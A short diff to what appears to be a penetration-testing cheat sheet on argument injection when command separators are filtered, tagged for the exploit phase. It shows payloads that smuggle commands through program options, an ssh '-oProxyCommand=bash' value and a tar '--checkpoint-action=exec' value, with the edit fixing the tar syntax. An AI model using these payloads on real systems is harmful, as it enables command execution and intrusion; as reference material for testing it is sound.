@@ -206,7 +206,7 @@ Abuse arg parsing when separators filtered.
 
 ```bash
 echo "-oProxyCommand=bash"
-echo "--checkpoint-action=shell_run='id'"
+echo "--checkpoint-action=exec='id'"
 ```
 
 <!-- meta: risk=med | phase=exploit | tags=cmdi,argi,bypass -->
